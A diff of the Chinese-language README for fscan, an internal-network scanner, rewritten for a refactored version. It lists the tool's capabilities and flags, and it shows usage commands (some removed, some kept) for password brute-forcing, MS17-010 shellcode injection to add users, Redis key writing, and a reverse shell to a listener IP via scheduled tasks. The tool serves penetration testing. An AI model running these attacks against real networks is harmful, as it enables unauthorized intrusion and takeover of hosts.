@@ -7,151 +7,211 @@
 ![Time](https://img.shields.io/badge/Join-20210422-green)
 <!--auto_detail_badge_end_fef74f2d7ea73fcc43ff78e05b1e7451-->
 
-# 简介
-一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。   
-支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。
+# 0x00 新增功能
+
+1、UI/UX 优化
+
+2、增加修改-f -o参数，-f支持txt/csv/json，输出格式优化
+
+3、增加端口指纹识别功能。
+
+4、增加本地信息搜集模块，增加本地域控探测模块，增加本地Minidump模块
+
+5、增加Telnet、VNC、Elasticsearch、RabbitMQ、Kafka、ActiveMQ、LDAP、SMTP、IMAP、POP3、SNMP、Zabbix、Modbus、Rsync、Cassandra、Neo4j扫描。
+
+6、架构重构，以反射+插件模块构建
+
+7、增加-log参数，支持INFO，SUCCESS、ERROR、DEBUG参数，用于调试具体信息。
+
+8、优化线程，现在会以更好的多线程运行
+
+
+
+**新版由于对旧版代码进行了全面的重构，难免会有Bug，请在遇到Bug时提交Issue，会尽快修复处理，感谢。**
+
+**欢迎提交新的插件模块，目前插件为快速热插拔形式，适用于简易开发。**
+
+# 0x01 简介
+
+一款功能丰富的内网综合扫描工具，提供一键自动化、全方位的漏洞扫描能力。
 
 ## 主要功能
-1.信息搜集:
-* 存活探测(icmp)
-* 端口扫描
 
-2.爆破功能:
-* 各类服务爆破(ssh、smb、rdp等)
-* 数据库密码爆破(mysql、mssql、redis、psql、oracle等)  
+- 主机存活探测：快速识别内网中的活跃主机
+- 端口扫描：全面检测目标主机开放端口
+- 服务爆破：支持对常见服务进行密码爆破测试
+- 漏洞利用：集成MS17-010等高危漏洞检测
+- Redis利用：支持批量写入公钥进行权限获取
+- 系统信息收集：可读取Windows网卡信息
+- Web应用检测：
+  - Web指纹识别
+  - Web漏洞扫描
+- 域环境探测：
+  - NetBIOS信息获取
+  - 域控制器识别
+- 后渗透功能：支持通过计划任务实现反弹shell
 
-3.系统信息、漏洞扫描:  
-* netbios探测、域控识别  
-* 获取目标网卡信息
-* 高危漏洞扫描(ms17010等)  
+# 0x02 主要功能
+## 1. 信息搜集
+- 基于ICMP的主机存活探测：快速识别网络中的活跃主机设备
+- 全面的端口扫描：系统地检测目标主机的开放端口情况
 
-4.Web探测功能:
-* webtitle探测
-* web指纹识别(常见cms、oa框架等)
-* web漏洞扫描(weblogic、st2等,支持xray的poc)
+## 2. 爆破功能
+- 常用服务密码爆破：支持SSH、SMB、RDP等多种协议的身份认证测试
+- 数据库密码爆破：覆盖MySQL、MSSQL、Redis、PostgreSQL、Oracle等主流数据库系统
 
-5.漏洞利用:
-* redis写公钥或写计划任务  
-* ssh命令执行  
-* ms17017利用(植入shellcode),如添加用户等  
+## 3. 系统信息与漏洞扫描
+- 网络信息收集：包括NetBIOS探测和域控制器识别
+- 系统信息获取：能够读取目标系统网卡配置信息
+- 安全漏洞检测：支持MS17-010等高危漏洞的识别与检测
 
-6.其他功能:
-* 文件保存
+## 4. Web应用探测
+- 网站信息收集：自动获取网站标题信息
+- Web指纹识别：可识别常见CMS系统与OA框架
+- 漏洞扫描能力：集成WebLogic、Struts2等漏洞检测，兼容XRay POC
 
-## usege
-简单用法
-``` 
-fscan.exe -h 192.168.1.1/24  (默认使用全部模块)
-fscan.exe -h 192.168.1.1/16  (B段扫描)
+## 5. 漏洞利用模块
+- Redis利用：支持写入公钥或植入计划任务
+- SSH远程执行：提供SSH命令执行功能
+- MS17-010利用：支持ShellCode注入，可实现添加用户等操作
+
+## 6. 辅助功能
+- 扫描结果存储：将所有检测结果保存至文件，便于后续分析
+
+# 0x03 使用说明
+
+## 基础扫描配置
+
+**以下参数由于重构原因并不能保证每一个参数都可以正常运行，出现问题请及时提交Issue。**
+
+**目标配置**
+
+```
+-h      指定目标(支持格式:192.168.1.1/24, 192.168.1.1-255, 192.168.1.1,192.168.1.2)
+-eh     排除特定目标
+-hf     从文件导入目标
 ```
 
-其他用法
+**端口配置**
 ```
-fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)
-fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)
-fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)
-fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)
-fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)
-fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)
-fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) 
-fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )
-fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)
-fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)
-fscan.exe -hf ip.txt  (以文件导入)
-fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)
-fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)
-fscan.exe -h 192.168.1.1/24 -pa 3389 (在原基础上,加入3389->rdp扫描)
-fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080
-fscan.exe -h 192.168.1.1/24 -m ms17017 -sc add (可在ms17010-exp.go自定义shellcode,内置添加用户等功能)
-```
-编译命令
-```
-go build -ldflags="-s -w " -trimpath
+-p      指定端口范围(默认常用端口)，如: -p 22,80,3306 或 -p 1-65535
+-portf  从文件导入端口列表
 ```
 
-完整参数
+## 认证配置
+
+**用户名密码**
 ```
-  -c string
-        ssh命令执行
-  -cookie string
-        设置cookie
-  -debug int
-        多久没响应,就打印当前进度(default 60)
-  -domain string
-        smb爆破模块时,设置域名
-  -h string
-        目标ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12
-  -hf string
-        读取文件中的目标
-  -hn string
-        扫描时,要跳过的ip: -hn 192.168.1.1/24
-  -m string
-        设置扫描模式: -m ssh (default "all")
-  -no
-        扫描结果不保存到文件中
-  -nobr
-        跳过sql、ftp、ssh等的密码爆破
-  -nopoc
-        跳过web poc扫描
-  -np
-        跳过存活探测
-  -num int
-        web poc 发包速率  (default 20)
-  -o string
-        扫描结果保存到哪 (default "result.txt")
-  -p string
-        设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default "21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017")
-  -pa string
-        新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)
-  -path string
-        fcgi、smb romote file path
-  -ping
-        使用ping代替icmp进行存活探测
-  -pn string
-        扫描时要跳过的端口,as: -pn 445
-  -pocname string
-        指定web poc的模糊名字, -pocname weblogic
-  -proxy string
-        设置代理, -proxy http://127.0.0.1:8080
-  -user string
-        指定爆破时的用户名
-  -userf string
-        指定爆破时的用户名文件
-  -pwd string
-        指定爆破时的密码
-  -pwdf string
-        指定爆破时的密码文件
-  -rf string
-        指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)
-  -rs string
-        redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)
-  -silent
-        静默扫描,适合cs扫描时不回显
-  -sshkey string
-        ssh连接时,指定ssh私钥
-  -t int
-        扫描线程 (default 600)
-  -time int
-        端口扫描超时时间 (default 3)
-  -u string
-        指定Url扫描
-  -uf string
-        指定Url文件扫描
-  -wt int
-        web访问超时时间 (default 5)
-  -pocpath string
-        指定poc路径
-  -usera string
-        在原有用户字典基础上,新增新用户
-  -pwda string
-        在原有密码字典基础上,增加新密码
-  -socks5
-        指定socks5代理 (as: -socks5  socks5://127.0.0.1:1080)
-  -sc 
-        指定ms17010利用模块shellcode,内置添加用户等功能 (as: -sc add)
+-user   指定用户名
+-pwd    指定密码
+-userf  用户名字典文件
+-pwdf   密码字典文件
+-usera  添加额外用户名
+-pwda   添加额外密码
+-domain 指定域名
 ```
 
-## 运行截图
+**SSH相关**
+```
+-sshkey SSH私钥路径
+-c      SSH连接后执行的命令
+```
+
+## 扫描控制
+
+**扫描模式**
+```
+-m      指定扫描模式(默认为All)
+-t      线程数(默认60)
+-time   超时时间(默认3秒)
+-top    存活检测结果展示数量(默认10)
+-np     跳过存活检测
+-ping   使用ping代替ICMP
+-skip   跳过指纹识别
+```
+
+## Web扫描配置
+
+```
+-u      指定单个URL扫描
+-uf     从文件导入URL列表
+-cookie 设置Cookie
+-wt     Web请求超时时间(默认5秒)
+```
+
+## 代理设置
+
+```
+-proxy  HTTP代理(如: http://127.0.0.1:8080)
+-socks5 SOCKS5代理(如: 127.0.0.1:1080)
+```
+
+## POC扫描配置
+
+```
+-pocpath POC文件路径
+-pocname 指定POC名称
+-full    启用完整POC扫描
+-dns     启用DNS日志
+-num     POC并发数(默认20)
+```
+
+## Redis利用配置
+
+```
+-rf      Redis文件名
+-rs      Redis Shell配置
+-noredis 禁用Redis检测
+```
+
+## 输出控制
+
+```
+-o       输出文件路径(默认关闭)
+-f       输出格式(默认txt)
+-no      禁用结果保存
+-silent  静默模式
+-nocolor 禁用彩色输出
+-json    JSON格式输出
+-log     日志级别设置
+-pg      显示扫描进度条
+```
+
+## 其他配置
+
+```
+-local   本地模式
+-nobr    禁用暴力破解
+-retry   最大重试次数(默认3次)
+-path    远程路径配置
+-hash    哈希值
+-hashf   哈希文件
+-sc      Shellcode配置
+-wmi     启用WMI
+-lang    语言设置(默认zh)
+```
+
+**以上参数由于重构原因并不能保证每一个参数都可以正常运行，出现问题请及时提交Issue。**
+
+## 编译说明
+
+```bash
+# 基础编译
+go build -ldflags="-s -w" -trimpath main.go
+
+# UPX压缩（可选）
+upx -9 fscan
+```
+
+## 系统安装
+```bash
+# Arch Linux
+yay -S fscan-git
+# 或
+paru -S fscan-git
+```
+
+# 0x04 运行截图
 
 `fscan.exe -h 192.168.x.x  (全功能、ms17010、读取网卡信息)`
 ![](https://github.com/shadow1ng/fscan/raw/main/image/1.png)
@@ -176,6 +236,11 @@ go build -ldflags="-s -w " -trimpath
 `go run .\main.go -h 192.0.0.0/8 -m icmp(探测每个C段的网关和数个随机IP,并统计top 10 B、C段存活数量)`
 ![img.png](https://github.com/shadow1ng/fscan/raw/main/image/live.png)
 
+新的展示
+
+![2.0-1](https://github.com/shadow1ng/fscan/raw/main/image/2.0-1.png)
+
+![2.0-2](https://github.com/shadow1ng/fscan/raw/main/image/2.0-2.png)
 
 <!--auto_detail_active_begin_e1c6fb434b6f0baf6912c7a1934f772b-->
 ## 项目相关
